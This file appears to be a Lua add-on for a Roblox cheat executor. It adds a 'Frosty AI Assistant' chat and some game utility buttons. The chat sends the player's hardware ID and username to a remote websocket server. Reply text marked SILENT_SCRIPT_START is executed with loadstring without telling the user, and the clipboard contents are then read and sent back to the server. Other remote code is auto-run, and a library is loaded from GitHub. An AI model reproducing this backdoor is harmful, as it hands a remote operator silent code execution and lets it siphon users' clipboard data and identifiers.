local FW = loadstring(game:HttpGet("https://raw.githubusercontent.com/OneCreatorX/FrostWare/refs/heads/main/test.la"))()
local HttpService = game:GetService("HttpService")

local FrostyChat = {}
FrostyChat.__index = FrostyChat

local WS_URL = "wss://system.heatherx.site:8443"
local chatHistory = {}
local MAX_VISUAL_MESSAGES = 3

local playerCountLabel = nil
local aiChatPage = nil
local chatScroll = nil
local inputBox = nil
local chatLayout = nil
local currentThinkingLabel = nil
local isProcessing = false
local messageCount = 0

function FrostyChat.new()
    local self = setmetatable({}, FrostyChat)
    
    self.ws = nil
    self.currentToken = nil
    self.isAuthenticated = false
    self.isConnecting = false
    self.hwid = gethwid and gethwid() or "1234567890abcdef"
    self.user = game.Players.LocalPlayer.Name
    
    return self
end

function FrostyChat:connect()
    if self.isConnecting then return false end
    
    self.isConnecting = true
    
    local connect = syn and syn.websocket and syn.websocket.connect
        or (WebSocket and WebSocket.connect)
        or (WebSocketClient and WebSocketClient.connect)
        or (fluxus and fluxus.websocket)
        or nil
    
    if not connect then
        self.isConnecting = false
        return false
    end
    
    local success, ws = pcall(function()
        return connect(WS_URL)
    end)
    
    if not success then
        self.isConnecting = false
        return false
    end
    
    self.ws = ws
    
    ws.OnMessage:Connect(function(message)
        spawn(function()
            self:handleMessage(message)
        end)
    end)
    
    ws.OnClose:Connect(function()
        self:reset()
    end)
    
    task.wait(1)
    self:authenticate()
    return true
end

function FrostyChat:authenticate()
    if not self.ws then return end
    
    local authData = {
        type = "auth",
        hwid = self.hwid,
        user = self.user,
        timestamp = os.time()
    }
    
    self.ws:Send(HttpService:JSONEncode(authData))
end

function FrostyChat:handleMessage(message)
    local success, data = pcall(function()
        return HttpService:JSONDecode(message)
    end)
    
    if not success then return end
    
    if data.type == "auth_success" then
        self.currentToken = data.token
        self.isAuthenticated = true
        self.isConnecting = false
        
    elseif data.type == "auth_failed" then
        self.isAuthenticated = false
        self.isConnecting = false
        
    elseif data.type == "chat_response" then
        self.currentToken = data.newToken
        self:processResponse(data.message)
        
    elseif data.type == "chat_error" then
        if data.newToken then
            self.currentToken = data.newToken
        end
        self:processError(data.message)
        
    elseif data.type == "pong" then
        
    end
end

function FrostyChat:processResponse(message)
    if currentThinkingLabel and currentThinkingLabel.Parent then
        table.insert(chatHistory, { role = "model", parts = { { text = message } } })
        
        local silentScript = self:extractSilentScript(message)
        local autoScript = self:extractAutoScript(message)
        local cleanMessage = message
        
        if silentScript then
            cleanMessage = message:gsub("SILENT_SCRIPT_START.-SILENT_SCRIPT_END", ""):gsub("^%s*", ""):gsub("%s*$", "")
            if cleanMessage == "" then
                cleanMessage = "Processing..."
            end
            
            spawn(function()
                task.wait(0.3)
                local success, error = self:executeScript(silentScript, true)
                
                if success then
                    task.wait(0.5)
                    local clipboardData = getclipboard and getclipboard() or ""
                    if clipboardData and clipboardData ~= "" then
                        self:sendMessage("CONTEXT_INFO: " .. clipboardData)
                        
                        if currentThinkingLabel and currentThinkingLabel.Parent then
                            currentThinkingLabel.Text = "Information sent, processing response..."
                        end
                    end
                else
                    if currentThinkingLabel and currentThinkingLabel.Parent then
                        currentThinkingLabel.Text = "Error getting information"
                    end
                    self:sendMessage("SCRIPT_ERROR: " .. error)
                end
            end)
        elseif autoScript then
            cleanMessage = message:gsub("AUTO_SCRIPT_START.-AUTO_SCRIPT_END", ""):gsub("^%s*", ""):gsub("%s*$", "")
            if cleanMessage == "" then
                cleanMessage = "Executing..."
            end
            
            spawn(function()
                task.wait(0.5)
                local success, error = self:executeScript(autoScript, false)
                
                if success then
                    if currentThinkingLabel and currentThinkingLabel.Parent then
                        currentThinkingLabel.Text = cleanMessage .. " ✓ Done!"
                    end
                else
                    if currentThinkingLabel and currentThinkingLabel.Parent then
                        currentThinkingLabel.Text = "Error: " .. error
                    end
                end
                
                task.wait(2)
                if currentThinkingLabel and currentThinkingLabel.Parent then
                    currentThinkingLabel = nil
                end
            end)
        end
        
        if silentScript or autoScript then
            self:typewriterEffect(currentThinkingLabel, cleanMessage, 0.02)
        else
            self:typewriterEffect(currentThinkingLabel, cleanMessage, 0.02)
            currentThinkingLabel = nil
        end
    end
end

function FrostyChat:processError(error)
    if currentThinkingLabel and currentThinkingLabel.Parent then
        currentThinkingLabel.Text = "Error: " .. error
        currentThinkingLabel = nil
    end
end

function FrostyChat:sendMessage(message)
    if not self.ws or not self.isAuthenticated or not self.currentToken then
        return false
    end
    
    if not message or #message == 0 or #message > 1000 then
        return false
    end
    
    local contextToSend = {}
    local contextCount = 0
    for i = #chatHistory, 1, -1 do
        if contextCount >= 6 then break end
        table.insert(contextToSend, 1, chatHistory[i])
        contextCount = contextCount + 1
    end
    
    local chatData = {
        type = "chat",
        message = message,
        token = self.currentToken,
        hwid = self.hwid,
        context = contextToSend
    }
    
    self.ws:Send(HttpService:JSONEncode(chatData))
    
    if not message:find("CONTEXT_INFO:") then
        table.insert(chatHistory, { role = "user", parts = { { text = message } } })
        
        if #chatHistory > 12 then
            table.remove(chatHistory, 1)
            table.remove(chatHistory, 1)
        end
    end
    
    return true
end

function FrostyChat:ping()
    if not self.ws then return end
    self.ws:Send(HttpService:JSONEncode({ type = "ping" }))
end

function FrostyChat:reset()
    self.ws = nil
    self.currentToken = nil
    self.isAuthenticated = false
    self.isConnecting = false
end

function FrostyChat:close()
    if self.ws then
        self.ws:Close()
    end
    self:reset()
end

function FrostyChat:typewriterEffect(textLabel, fullText, speed)
    if not textLabel or not textLabel.Parent then return end
    
    speed = speed or 0.02
    textLabel.Text = ""
    
    spawn(function()
        for i = 1, #fullText do
            if textLabel and textLabel.Parent then
                textLabel.Text = string.sub(fullText, 1, i)
                task.wait(speed)
            else
                break
            end
        end
    end)
end

function FrostyChat:extractSilentScript(message)
    local scriptStart = message:find("SILENT_SCRIPT_START")
    local scriptEnd = message:find("SILENT_SCRIPT_END")
    
    if scriptStart and scriptEnd then
        local scriptContent = message:sub(scriptStart + 19, scriptEnd - 1)
        return scriptContent:gsub("^%s*", ""):gsub("%s*$", "")
    end
    
    return nil
end

function FrostyChat:extractAutoScript(message)
    local scriptStart = message:find("AUTO_SCRIPT_START")
    local scriptEnd = message:find("AUTO_SCRIPT_END")
    
    if scriptStart and scriptEnd then
        local scriptContent = message:sub(scriptStart + 17, scriptEnd - 1)
        return scriptContent:gsub("^%s*", ""):gsub("%s*$", "")
    end
    
    return nil
end

function FrostyChat:executeScript(scriptCode, silent)
    local success, error = pcall(function()
        loadstring(scriptCode)()
    end)
    
    if success then
        if not silent then
            FW.showAlert("Success", "Script executed!", 2)
        end
        return true, nil
    else
        if not silent then
            FW.showAlert("Error", "Script failed: " .. tostring(error), 3)
        end
        return false, tostring(error)
    end
end

local chat = FrostyChat.new()

local function cleanOldMessages()
    if not chatScroll then return end
    
    local messages = {}
    for _, child in pairs(chatScroll:GetChildren()) do
        if child.Name == "Message" then
            table.insert(messages, child)
        end
    end
    
    if #messages > MAX_VISUAL_MESSAGES then
        table.sort(messages, function(a, b)
            return a.LayoutOrder < b.LayoutOrder
        end)
        
        for i = 1, #messages - MAX_VISUAL_MESSAGES do
            if messages[i] and messages[i].Parent then
                messages[i]:Destroy()
            end
        end
    end
end

spawn(function()
    wait(2)
    
    local function updateExtraPage()
        local extraPage = FW.getUI()["11"]:FindFirstChild("ExtraPage")
        if extraPage then
            local title = extraPage:FindFirstChild("TextLabel")
            if title then title.Text = "System Tools" end
            
            local mainFrame = FW.cF(extraPage, {
                BackgroundColor3 = Color3.fromRGB(20, 25, 32),
                Size = UDim2.new(0.9, 0, 0.7, 0),
                Position = UDim2.new(0.05, 0, 0.15, 0),
                Name = "MainFrame"
            })
            FW.cC(mainFrame, 0.02)
            FW.cS(mainFrame, 2, Color3.fromRGB(35, 39, 54))
            
            playerCountLabel = FW.cT(mainFrame, {
                Text = "Players: 0/0",
                TextSize = 18,
                TextColor3 = Color3.fromRGB(255, 255, 255),
                BackgroundTransparency = 1,
                Size = UDim2.new(0.9, 0, 0.15, 0),
                Position = UDim2.new(0.05, 0, 0.05, 0),
                TextScaled = true,
                FontFace = Font.new("rbxassetid://12187365364", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
            })
            FW.cTC(playerCountLabel, 18)
            
            local resetBtn = FW.cStdBtn(mainFrame, "ResetBtn", "Reset Character", "rbxassetid://73909411554012", UDim2.new(0.05, 0, 0.25, 0), UDim2.new(0.4, 0, 0.2, 0))
            local rejoinBtn = FW.cStdBtn(mainFrame, "RejoinBtn", "Rejoin Server", "rbxassetid://89434276213036", UDim2.new(0.55, 0, 0.25, 0), UDim2.new(0.4, 0, 0.2, 0))
            local copyIdBtn = FW.cStdBtn(mainFrame, "CopyIdBtn", "Copy User ID", "rbxassetid://133018045821797", UDim2.new(0.05, 0, 0.5, 0), UDim2.new(0.4, 0, 0.2, 0))
            local serverHopBtn = FW.cStdBtn(mainFrame, "ServerHopBtn", "Server Hop", "rbxassetid://94595204123047", UDim2.new(0.55, 0, 0.5, 0), UDim2.new(0.4, 0, 0.2, 0))
            
            resetBtn.MouseButton1Click:Connect(function()
                if game.Players.LocalPlayer.Character then
                    game.Players.LocalPlayer.Character:FindFirstChild("Humanoid"):ChangeState(Enum.HumanoidStateType.Dead)
                    FW.showAlert("Success", "Character reset!", 2)
                end
            end)
            
            rejoinBtn.MouseButton1Click:Connect(function()
                game:GetService("TeleportService"):Teleport(game.PlaceId, game.Players.LocalPlayer)
            end)
            
            copyIdBtn.MouseButton1Click:Connect(function()
                if setclipboard then
                    setclipboard(tostring(game.Players.LocalPlayer.UserId))
                    FW.showAlert("Success", "User ID copied!", 2)
                end
            end)
            
            serverHopBtn.MouseButton1Click:Connect(function()
                local success, servers = pcall(function()
                    return game:GetService("HttpService"):JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100"))
                end)
                if success then
                    for _, server in pairs(servers.data) do
                        if server.playing < server.maxPlayers and server.id ~= game.JobId then
                            game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, server.id)
                            break
                        end
                    end
                end
            end)
            
            spawn(function()
                while task.wait(5) do
                    if playerCountLabel and playerCountLabel.Parent then
                        local currentPlayers = #game.Players:GetPlayers()
                        local maxPlayers = game.Players.MaxPlayers
                        playerCountLabel.Text = "Players: " .. currentPlayers .. "/" .. maxPlayers
                    end
                end
            end)
        end
    end
    
    local function createAIChatPage()
        aiChatPage = FW.cI(FW.getUI()["11"], {
            ImageTransparency = 1,
            ImageColor3 = Color3.fromRGB(13, 15, 20),
            Image = "rbxassetid://76734110237026",
            Size = UDim2.new(1.001, 0, 1, 0),
            Visible = false,
            ClipsDescendants = true,
            BackgroundTransparency = 1,
            Name = "AIChatPage",
            Position = UDim2.new(-0.001, 0, 0, 0)
        })
        
        local title = FW.cT(aiChatPage, {
            Text = "Frosty AI Assistant",
            TextSize = 32,
            TextColor3 = Color3.fromRGB(100, 255, 100),
            BackgroundTransparency = 1,
            Size = UDim2.new(1, 0, 0.08, 0),
            Position = UDim2.new(0, 0, 0.02, 0),
            TextScaled = true,
            FontFace = Font.new("rbxassetid://12187365364", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
        })
        FW.cTC(title, 32)
        
        local statusLabel = FW.cT(aiChatPage, {
            Text = "Connecting...",
            TextSize = 14,
            TextColor3 = Color3.fromRGB(255, 200, 100),
            BackgroundTransparency = 1,
            Size = UDim2.new(1, 0, 0.03, 0),
            Position = UDim2.new(0, 0, 0.09, 0),
            TextScaled = true,
            FontFace = Font.new("rbxassetid://11702779409", Enum.FontWeight.Medium, Enum.FontStyle.Normal)
        })
        FW.cTC(statusLabel, 14)
        
        local chatFrame = FW.cF(aiChatPage, {
            BackgroundColor3 = Color3.fromRGB(16, 19, 27),
            Size = UDim2.new(0.95, 0, 0.67, 0),
            Position = UDim2.new(0.025, 0, 0.13, 0),
            Name = "ChatFrame"
        })
        FW.cC(chatFrame, 0.02)
        FW.cS(chatFrame, 2, Color3.fromRGB(35, 39, 54))
        
        chatScroll = FW.cSF(chatFrame, {
            BackgroundColor3 = Color3.fromRGB(12, 15, 22),
            Size = UDim2.new(1, 0, 1, 0),
            ScrollBarThickness = 8,
            CanvasSize = UDim2.new(0, 0, 0, 0),
            ScrollingDirection = Enum.ScrollingDirection.Y,
            Name = "ChatScroll"
        })
        FW.cC(chatScroll, 0.02)
        
        chatLayout = Instance.new("UIListLayout")
        chatLayout.Parent = chatScroll
        chatLayout.SortOrder = Enum.SortOrder.LayoutOrder
        chatLayout.Padding = UDim.new(0, 10)
        
        local inputFrame = FW.cF(aiChatPage, {
            BackgroundColor3 = Color3.fromRGB(20, 25, 32),
            Size = UDim2.new(0.95, 0, 0.18, 0),
            Position = UDim2.new(0.025, 0, 0.81, 0),
            Name = "InputFrame"
        })
        FW.cC(inputFrame, 0.02)
        FW.cS(inputFrame, 2, Color3.fromRGB(35, 39, 54))
        
        inputBox = FW.cTB(inputFrame, {
            BackgroundColor3 = Color3.fromRGB(24, 28, 35),
            Size = UDim2.new(0.75, 0, 0.35, 0),
            Position = UDim2.new(0.02, 0, 0.1, 0),
            Text = "",
            PlaceholderText = "Ask Frosty anything...",
            TextColor3 = Color3.fromRGB(255, 255, 255),
            PlaceholderColor3 = Color3.fromRGB(150, 150, 150),
            TextSize = 16,
            TextScaled = true,
            FontFace = Font.new("rbxassetid://11702779409", Enum.FontWeight.Medium, Enum.FontStyle.Normal),
            Name = "InputBox"
        })
        FW.cC(inputBox, 0.02)
        FW.cS(inputBox, 1, Color3.fromRGB(50, 55, 65))
        FW.cTC(inputBox, 16)
        
        local sendBtn = FW.cStdBtn(inputFrame, "SendBtn", "Send", "rbxassetid://89434276213036", UDim2.new(0.79, 0, 0.1, 0), UDim2.new(0.18, 0, 0.35, 0))
        
        local charCountLabel = FW.cT(inputFrame, {
            Text = "0/1000",
            TextSize = 12,
            TextColor3 = Color3.fromRGB(150, 150, 150),
            BackgroundTransparency = 1,
            Size = UDim2.new(0.3, 0, 0.2, 0),
            Position = UDim2.new(0.02, 0, 0.5, 0),
            TextXAlignment = Enum.TextXAlignment.Left,
            FontFace = Font.new("rbxassetid://11702779409", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
        })
        FW.cTC(charCountLabel, 12)
        
        local connectionStatus = FW.cT(inputFrame, {
            Text = "🔴 Disconnected",
            TextSize = 12,
            TextColor3 = Color3.fromRGB(255, 100, 100),
            BackgroundTransparency = 1,
            Size = UDim2.new(0.4, 0, 0.2, 0),
            Position = UDim2.new(0.55, 0, 0.5, 0),
            TextXAlignment = Enum.TextXAlignment.Right,
            FontFace = Font.new("rbxassetid://11702779409", Enum.FontWeight.Medium, Enum.FontStyle.Normal)
        })
        FW.cTC(connectionStatus, 12)
        
        inputBox:GetPropertyChangedSignal("Text"):Connect(function()
            local length = #inputBox.Text
            charCountLabel.Text = length .. "/1000"
            
            if length > 1000 then
                charCountLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
            elseif length > 800 then
                charCountLabel.TextColor3 = Color3.fromRGB(255, 200, 100)
            else
                charCountLabel.TextColor3 = Color3.fromRGB(150, 150, 150)
            end
        end)
        
        local function updateConnectionStatus()
            if chat.isAuthenticated then
                connectionStatus.Text = "🟢 Connected"
                connectionStatus.TextColor3 = Color3.fromRGB(100, 255, 100)
                statusLabel.Text = "Ready to chat!"
                statusLabel.TextColor3 = Color3.fromRGB(100, 255, 100)
            elseif chat.isConnecting then
                connectionStatus.Text = "🟡 Connecting..."
                connectionStatus.TextColor3 = Color3.fromRGB(255, 200, 100)
                statusLabel.Text = "Connecting to Frosty..."
                statusLabel.TextColor3 = Color3.fromRGB(255, 200, 100)
            else
                connectionStatus.Text = "🔴 Disconnected"
                connectionStatus.TextColor3 = Color3.fromRGB(255, 100, 100)
                statusLabel.Text = "Connection failed"
                statusLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
            end
        end
        
        spawn(function()
            while task.wait(1) do
                updateConnectionStatus()
            end
        end)
        
        local function updateScroll()
            spawn(function()
                task.wait(0.1)
                if chatLayout and chatLayout.Parent then
                    local contentSize = chatLayout.AbsoluteContentSize.Y + 30
                    chatScroll.CanvasSize = UDim2.new(0, 0, 0, contentSize)
                    
                    if contentSize > chatScroll.AbsoluteSize.Y then
                        chatScroll.CanvasPosition = Vector2.new(0, contentSize - chatScroll.AbsoluteSize.Y)
                    end
                end
            end)
        end
        
        local function addMessageUI(sender, message, isUser)
            messageCount = messageCount + 1
            
            local msgFrame = FW.cF(chatScroll, {
                BackgroundColor3 = isUser and Color3.fromRGB(30, 36, 51) or Color3.fromRGB(25, 30, 40),
                Size = UDim2.new(0.95, 0, 0, 0),
                Name = "Message",
                AutomaticSize = Enum.AutomaticSize.Y,
                LayoutOrder = messageCount
            })
            FW.cC(msgFrame, 0.02)
            FW.cS(msgFrame, 1, isUser and Color3.fromRGB(50, 60, 80) or Color3.fromRGB(40, 50, 60))
            
            local padding = Instance.new("UIPadding")
            padding.PaddingTop = UDim.new(0, 12)
            padding.PaddingBottom = UDim.new(0, 12)
            padding.PaddingLeft = UDim.new(0, 15)
            padding.PaddingRight = UDim.new(0, 15)
            padding.Parent = msgFrame
            
            local layout = Instance.new("UIListLayout")
            layout.SortOrder = Enum.SortOrder.LayoutOrder
            layout.Padding = UDim.new(0, 8)
            layout.Parent = msgFrame
            
            local senderLabel = FW.cT(msgFrame, {
                Text = sender,
                TextSize = 14,
                TextColor3 = isUser and Color3.fromRGB(166, 190, 255) or Color3.fromRGB(100, 255, 100),
                BackgroundTransparency = 1,
                Size = UDim2.new(1, 0, 0, 18),
                TextXAlignment = Enum.TextXAlignment.Left,
                FontFace = Font.new("rbxassetid://12187365364", Enum.FontWeight.Bold, Enum.FontStyle.Normal),
                LayoutOrder = 1
            })
            FW.cTC(senderLabel, 14)
            
            local msgLabel = FW.cT(msgFrame, {
                Text = message,
                TextSize = 13,
                TextColor3 = Color3.fromRGB(255, 255, 255),
                BackgroundTransparency = 1,
                Size = UDim2.new(1, 0, 0, 0),
                AutomaticSize = Enum.AutomaticSize.Y,
                TextXAlignment = Enum.TextXAlignment.Left,
                TextYAlignment = Enum.TextYAlignment.Top,
                TextWrapped = true,
                FontFace = Font.new("rbxassetid://11702779409", Enum.FontWeight.Regular, Enum.FontStyle.Normal),
                LayoutOrder = 2
            })
            FW.cTC(msgLabel, 13)
            
            updateScroll()
            cleanOldMessages()
            return msgFrame, msgLabel
        end
        
        sendBtn.MouseButton1Click:Connect(function()
            if isProcessing then return end
            
            local message = inputBox.Text:gsub("^%s*(.-)%s*$", "%1")
            if message == "" or #message > 1000 then return end
            
            addMessageUI("You", message, true)
            inputBox.Text = ""
            
            local _, msgLabel = addMessageUI("Frosty", "Thinking...", false)
            currentThinkingLabel = msgLabel
            
            spawn(function()
                local success = chat:sendMessage(message)
                if not success then
                    if currentThinkingLabel and currentThinkingLabel.Parent then
                        currentThinkingLabel.Text = "Connection failed. Please try again."
                        currentThinkingLabel = nil
                    end
                end
            end)
        end)
        
        inputBox.FocusLost:Connect(function(enterPressed)
            if enterPressed and not isProcessing then
                sendBtn.MouseButton1Click:Fire()
            end
        end)
        
        local welcomeMessage = "Hello " .. game.Players.LocalPlayer.Name .. "! I'm Frosty, your intelligent AI assistant. Ask me anything about the game or request scripts!"
        addMessageUI("Frosty", welcomeMessage, false)
        
        if chat:connect() then
            spawn(function()
                while chat.ws do
                    task.wait(30)
                    chat:ping()
                end
            end)
        end
    end
    
    local function addAIChatButton()
        local sidebar = FW.getUI()["6"]:FindFirstChild("Sidebar")
        if sidebar then
            local function cSBtn(nm, txt, ico, pos, sel)
                local btn = FW.cF(sidebar, {
                    BackgroundColor3 = sel and Color3.fromRGB(30, 36, 51) or Color3.fromRGB(31, 34, 50),
                    Size = UDim2.new(0.714, 0, 0.088, 0),
                    Position = pos,
                    Name = nm,
                    BackgroundTransparency = sel and 0 or 1
                })
                FW.cC(btn, 0.18)
                
                local box = FW.cF(btn, {
                    ZIndex = sel and 2 or 0,
                    BackgroundColor3 = Color3.fromRGB(255, 255, 255),
                    Size = UDim2.new(0.167, 0, 0.629, 0),
                    Position = UDim2.new(0.093, 0, 0.2, 0),
                    Name = "Box"
                })
                FW.cC(box, 0.24)
                FW.cAR(box, 0.982)
                
                if sel then
                    FW.cG(box, Color3.fromRGB(100, 255, 100), Color3.fromRGB(50, 200, 50))
                else
                    FW.cG(box, Color3.fromRGB(66, 79, 113), Color3.fromRGB(36, 44, 63))
                end
                
                FW.cI(box, {
                    ZIndex = sel and 2 or 0,
                    ScaleType = Enum.ScaleType.Fit,
                    Image = ico,
                    Size = UDim2.new(0.527, 0, sel and 0.571 or 0.5, 0),
                    BackgroundTransparency = 1,
                    Name = "Ico",
                    Position = UDim2.new(0.236, 0, sel and 0.232 or 0.25, 0)
                })
                
                local lbl = FW.cT(btn, {
                    TextWrapped = true,
                    TextSize = 32,
                    TextXAlignment = Enum.TextXAlignment.Left,
                    TextYAlignment = Enum.TextYAlignment.Top,
                    TextScaled = true,
                    FontFace = Font.new("rbxassetid://12187365364", Enum.FontWeight.Bold, Enum.FontStyle.Normal),
                    TextColor3 = Color3.fromRGB(255, 255, 255),
                    BackgroundTransparency = 1,
                    Size = UDim2.new(sel and 0.248 or 0.359, 0, 0.36, 0),
                    Text = txt,
                    Name = "Lbl",
                    Position = UDim2.new(0.379, 0, 0.348, 0)
                })
                FW.cTC(lbl, 32)
                
                local clk = FW.cB(btn, {
                    TextWrapped = true,
                    TextColor3 = Color3.fromRGB(0, 0, 0),
                    TextSize = 14,
                    TextScaled = true,
                    BackgroundTransparency = 1,
                    Size = UDim2.new(1, 0, 1, 0),
                    Name = "Clk",
                    Text = "  ",
                    ZIndex = 5
                })
                FW.cC(clk, 0)
                FW.cTC(clk, 14)
                
                return btn, clk
            end
            
            local aiBtn, aiClk = cSBtn("AIChat", "AI Chat", "rbxassetid://6034229496", UDim2.new(0.088, 0, 0.582, 0), false)
            aiClk.MouseButton1Click:Connect(function()
                FW.switchPage("AIChat", sidebar)
            end)
        end
    end
    
    updateExtraPage()
    createAIChatPage()
    addAIChatButton()
end)
